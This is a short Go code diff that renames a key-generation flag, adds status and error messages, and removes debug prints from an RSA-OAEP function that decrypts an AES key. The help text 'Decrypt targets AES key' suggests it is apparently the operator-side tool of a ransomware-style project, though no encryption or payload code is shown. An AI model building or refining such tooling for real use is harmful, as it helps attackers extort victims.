@@ -18,7 +18,7 @@ func main() {
 	var genRsaKeys bool
 	var encAesKey string
 
-	flag.BoolVar(&genRsaKeys, "genKeys", false, "Generate server RSA keys")
+	flag.BoolVar(&genRsaKeys, "genkeys", false, "Generate server RSA keys")
 	flag.StringVar(&encAesKey, "decryptAES", "", "Decrypt targets AES key")
 	flag.Parse()
 
@@ -28,12 +28,13 @@ func main() {
 			fmt.Println(err)
 			os.Exit(1)
 		}
+		fmt.Println("Created public_key.pem and private_key.pem")
 	}
 
 	if encAesKey != "" {
 		aesKey, err := decryptAesKey(encAesKey)
 		if err != nil {
-			fmt.Println(err)
+			fmt.Println(err, ": Possibly missing or incorrect private key")
 			os.Exit(1)
 		}
 		fmt.Println(aesKey)
@@ -115,10 +116,8 @@ func decryptAesKey(hexKey string) ([]byte, error) {
 	}
 	aesKey, err = rsa.DecryptOAEP(sha256.New(), rand.Reader, privKey, aesEncKey, nil)
 	if err != nil {
-		fmt.Println(err)
 		return aesKey, err
 	}
-	fmt.Println(aesKey)
 	return aesKey, nil
 }
 
